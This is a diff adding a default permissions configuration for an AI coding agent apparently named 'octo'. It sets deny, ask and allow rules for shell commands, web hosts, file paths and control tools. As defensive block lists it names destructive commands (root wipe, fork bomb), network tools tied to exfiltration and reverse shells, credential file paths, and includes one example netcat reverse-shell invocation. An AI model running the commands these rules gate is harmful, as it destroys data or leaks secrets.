@@ -1,0 +1,227 @@
+# Default permission rules. Used when ~/.octo/permissions.yml does not
+# exist or as the base layer that user rules extend.
+#
+# Decision priority within a tool's rule list is tiered, not positional:
+# deny beats ask beats allow, regardless of declaration order — the first
+# match within the winning tier is reported as the reason. If nothing
+# matches in any tier, the implicit default is `ask`.
+#
+# Pattern rules (for `terminal`) are case-sensitive SUBSTRING matches
+# against the input command, with two refinements:
+#   - a pattern ending in `/` or `~` (a filesystem-root marker) only matches
+#     when that marker ends an argument, so `rm -rf /` blocks a root wipe but
+#     not `rm -rf /path/under`;
+#   - a pattern starting with `^` is command-position anchored: it matches the
+#     command word itself (also after sudo/env/xargs wrappers, flags, and
+#     chain operators like `;`/`&&`), not incidental text inside arguments —
+#     `^nc` matches `nc -e /bin/bash host 4444` but not `rg "func "`.
+# Path rules use glob syntax with `**` meaning
+# "any number of directory components". Hostname rules use glob with `*`
+# matching a single label (so `*.dev` matches `foo.dev` but not `foo.bar.dev`).
+
+terminal:
+  # Absolute disasters — never ask, always deny. These predate the hardcoded
+  # engine-level guards (permission.applyHardcodedDenyRules), which are the
+  # single source for the full catastrophe list (disk destruction, power
+  # commands, system-directory removal, …) and apply even over a user
+  # override of this file.
+  - deny:  { pattern: "rm -rf /" }
+  - deny:  { pattern: "rm -rf ~" }
+  - deny:  { pattern: ":(){ :|:& };:" }   # fork bomb
+  # Risky but legitimate — confirm interactively.
+  - ask:   { pattern: "rm -rf" }
+  - ask:   { pattern: "rm -fr" }
+  - ask:   { pattern: "git push --force" }
+  - ask:   { pattern: "git push -f " }
+  - ask:   { pattern: "chmod -R 777" }
+  - ask:   { pattern: "sudo " }
+  # Network / remote tools that can exfiltrate or spawn reverse shells.
+  - ask:   { pattern: "curl " }
+  - ask:   { pattern: "wget " }
+  - ask:   { pattern: "ssh " }
+  - ask:   { pattern: "scp " }
+  - ask:   { pattern: "^nc" }               # netcat
+  - ask:   { pattern: "^ncat" }
+  - ask:   { pattern: "^socat" }
+  - ask:   { pattern: "^nmap" }             # port scanning
+  # System administration that affects the whole machine.
+  - ask:   { pattern: "^systemctl" }        # system services (poweroff/reboot denied by hardcoded guards)
+  - ask:   { pattern: "^iptables" }         # Linux firewall
+  - ask:   { pattern: "^ip6tables" }        # Linux firewall
+  - ask:   { pattern: "^pfctl" }            # macOS firewall
+  - ask:   { pattern: "^crontab" }          # scheduled jobs
+  - ask:   { pattern: "^launchctl" }        # macOS services
+  - ask:   { pattern: "^diskutil" }         # macOS disk utilities (erase/partition denied by hardcoded guards)
+  # Container cleanup that can destroy environments.
+  - ask:   { pattern: "^docker rm -f" }     # force-remove containers
+  - ask:   { pattern: "^docker rmi -f" }    # force-remove images
+  - ask:   { pattern: "^docker system prune" } # bulk deletion
+  # Disk-space exhaustion.
+  - ask:   { pattern: "^fallocate -l" }     # preallocate large files
+  - ask:   { pattern: "^truncate -s" }      # grow files arbitrarily
+  # Windows / PowerShell dangers. Matching is case-sensitive and PowerShell is
+  # case-insensitive with aliases, so these catch the canonical forms an LLM
+  # typically emits — anything missed still falls through to the implicit
+  # `ask` (prompt in interactive, deny in strict), never auto-run.
+  # (`rm -rf` above already covers the PowerShell `rm` alias; system-dir
+  # targets of every deletion spelling are denied by the hardcoded guards.)
+  - deny:  { pattern: "Remove-Item -Recurse -Force" }
+  - deny:  { pattern: "Remove-Item -Force -Recurse" }
+  - deny:  { pattern: "Format-Volume" }
+  # Untargeted recursive deletion — the cmd.exe counterpart of `rm -rf`.
+  - ask:   { pattern: "^rmdir /s /q" }
+  - ask:   { pattern: "^rd /s /q" }
+  - ask:   { pattern: "^del /s /q" }
+  - ask:   { pattern: "^erase /s /q" }
+  # Windows system administration — risky but has legitimate uses.
+  - ask:   { pattern: "^wmic" }             # Windows Management Instrumentation
+  - ask:   { pattern: "^sc" }               # service control
+  - ask:   { pattern: "^schtasks" }         # scheduled tasks
+  - ask:   { pattern: "^netsh" }            # network shell
+  - ask:   { pattern: "^icacls" }           # permissions
+  - ask:   { pattern: "^takeown" }          # ownership seizure
+  - ask:   { pattern: "^robocopy" }         # can overwrite system dirs
+  - ask:   { pattern: "^xcopy" }            # can overwrite system files
+  - ask:   { pattern: "^mklink" }           # can link into system dirs
+  - ask:   { pattern: "^dism" }             # system image servicing (also has read-only uses)
+  - ask:   { pattern: "^fsutil" }           # filesystem utilities (createnew et al. are benign)
+  - ask:   { pattern: "^sdelete" }          # secure delete (targeted, like rm)
+  - ask:   { pattern: "^powershell" }       # arbitrary PowerShell code
+  - ask:   { pattern: "^cmd /c" }           # arbitrary cmd code
+  - ask:   { pattern: "Invoke-Expression" }        # arbitrary code (alias: iex)
+  - ask:   { pattern: "Invoke-WebRequest" }        # download / exfiltrate (alias: iwr)
+  - ask:   { pattern: "Invoke-RestMethod" }        # alias: irm
+  - ask:   { pattern: "Set-ExecutionPolicy" }
+  - ask:   { pattern: "Start-Process" }            # can launch arbitrary binaries
+  # Sensitive-path access — must precede the safe-verb allows below, otherwise
+  # `cat /etc/passwd` would match `allow: cat ` and slip through. Substring
+  # matches are intentionally specific to avoid false positives.
+  - ask:   { pattern: "/etc/shadow" }
+  - ask:   { pattern: "/etc/passwd" }
+  - ask:   { pattern: ".ssh/id_" }
+  - ask:   { pattern: ".aws/credentials" }
+  - ask:   { pattern: "id_rsa" }
+  - ask:   { pattern: "id_ed25519" }
+  # Common safe commands — auto-allow so the user isn't drowning in prompts.
+  - allow: { pattern: "ls" }
+  - allow: { pattern: "cat " }
+  - allow: { pattern: "echo " }
+  - allow: { pattern: "pwd" }
+  - allow: { pattern: "git status" }
+  - allow: { pattern: "git log" }
+  - allow: { pattern: "git diff" }
+  - allow: { pattern: "git branch" }
+  - allow: { pattern: "go test" }
+  - allow: { pattern: "go build" }
+  - allow: { pattern: "go vet" }
+  - allow: { pattern: "gofmt" }
+  # Read-only locator for the agent's own memory directories. Without this it
+  # falls through to the implicit ask — which ModeStrict (the unattended /IM
+  # default) turns into a deny, so the agent could never resolve another
+  # project's memory dir and every cross-project note would pile into the
+  # shared index instead (see memory.RenderInjection's guidance).
+  - allow: { pattern: "^octo memory" }
+  # Anything else falls through to the implicit `ask`.
+
+web_fetch:
+  # Block private / link-local / loopback ranges — SSRF protection.
+  # IPv4 private + loopback, IPv6 loopback / link-local / IPv4-mapped loopback,
+  # and localhost names are all denied.
+  - deny:  { hostname: ["10.*", "192.168.*", "172.16.*", "172.17.*", "172.18.*", "172.19.*", "172.2*.*", "172.30.*", "172.31.*", "127.*", "169.254.*", "localhost", "*.local", "::1", "0:0:0:0:0:0:0:1", "::ffff:127.*", "::ffff:7f00:*", "fe80:*", "fc*:*", "fd*:*"] }
+  # Pre-approved hosts known to be safe.
+  - allow: { hostname: ["github.com", "*.github.com", "stackoverflow.com", "*.stackoverflow.com", "go.dev", "*.go.dev", "pkg.go.dev"] }
+  # Other hosts fall through to ask.
+
+# Writing/editing is never blanket-allowed just for being inside $CWD — that
+# would make `octo serve` launched from e.g. $HOME silently writable across
+# the whole home directory with zero prompt, in every mode including
+# interactive. Beyond the secret-path denies below, every path (in or out of
+# CWD) falls through to the implicit ask: interactive really prompts (and
+# remembers per-file for the session, see permission.signature), auto allows,
+# strict denies. Callers that legitimately need unattended or pre-approved
+# write access (cron task sessions, `octo init`'s own output file) get it
+# explicitly — via that session's permission_mode or via allowWriteRoots —
+# not through a rule here.
+# (System directories — /bin, /usr, C:/Windows, … — are denied by the
+# hardcoded engine-level guards, which also survive a user override.)
+write_file:
+  - deny:  { path: ["**/.ssh/**", "/etc/**", "**/.env", "**/.env.*", "**/id_rsa*", "**/id_ed25519*", "**/id_ecdsa*"] }
+
+edit_file:
+  - deny:  { path: ["**/.ssh/**", "/etc/**", "**/.env", "**/.env.*", "**/id_rsa*", "**/id_ed25519*", "**/id_ecdsa*"] }
+
+# read_file is generally safe; only block the obvious credential bombs.
+read_file:
+  - deny:  { path: ["**/.ssh/id_*", "**/id_rsa*", "**/id_ed25519*", "**/id_ecdsa*", "**/.env", "**/.env.*"] }
+  - allow: { path: ["**"] }
+
+# terminal_output reads background processes started by this same session via
+# `terminal` run_in_background:"interactive". Async processes reject reads; only
+# interactive services/REPLs are observable. Low risk, so allow without prompting.
+# The launching `terminal` call is already gated above.
+terminal_output:
+  - allow: { pattern: "" }
+
+# Pattern-free tools default to allow — they don't have a meaningful
+# axis to gate on, and asking on every glob/grep would be unusable.
+glob:
+  - allow: { pattern: "" }
+grep:
+  - allow: { pattern: "" }
+web_search:
+  - allow: { pattern: "" }
+
+# sqlite reaches only the named databases under ~/.octo/databases/ (ATTACH
+# and VACUUM INTO are refused on every connection). A scheduled task is its
+# main writer, and there the implicit ask resolves to deny.
+sqlite:
+  - allow: { pattern: "" }
+
+# Control-plane / meta tools — allowed without prompting. They have no direct
+# side effect: a sub-agent inherits its parent's gate, so sub_agent can't let
+# it do anything the gate wouldn't already permit, and the task_* tools are
+# in-memory bookkeeping. Without an allow here they fall through to the implicit
+# ask, which a non-interactive transport (HTTP server, IM bridge) resolves to
+# deny — silently disabling sub-agents and tasks there.
+sub_agent:
+  - allow: { pattern: "" }
+# The follow-up surface shares sub_agent's posture: a message to a child is
+# executed under the parent's gate inside the child (its tool calls are
+# gated individually), status is read-only, and kill only reclaims
+# resources the parent itself started.
+sub_agent_send:
+  - allow: { pattern: "" }
+sub_agent_status:
+  - allow: { pattern: "" }
+sub_agent_kill:
+  - allow: { pattern: "" }
+task_create:
+  - allow: { pattern: "" }
+task_update:
+  - allow: { pattern: "" }
+task_list:
+  - allow: { pattern: "" }
+
+# ask_user_question solicits a choice from the user and waits — it has no side
+# effect of its own, and it IS the interaction, so routing it through a separate
+# permission prompt is both redundant (interactive) and fatal everywhere else: a
+# non-interactive transport resolves the implicit ask to deny, silently killing
+# the question — which strands the onboard flow (its first step) and any skill
+# that asks a question. Allow without prompting, like the other control tools.
+ask_user_question:
+  - allow: { pattern: "" }
+
+# Skill invocation is a dispatch to a markdown instruction file — no direct side
+# effect beyond what the skill's own tools (already gated) do. Allow without
+# prompting so the onboard and other skill flows work over HTTP / IM.
+skill:
+  - allow: { pattern: "" }
+
+# Process restart — always confirm. The implicit default would already be
+# ask, but the rule is explicit so nobody pattern-matches this block and
+# adds an allow: an unconfirmed restart_server call would bounce the whole
+# server. The web UI confirms via the browser modal; IM channels confirm
+# via the in-chat reply prompt (explicit affirmative only). Auto-approve
+# mode runs it without prompting, like everything else.
+restart_server:
+  - ask: { pattern: "" }
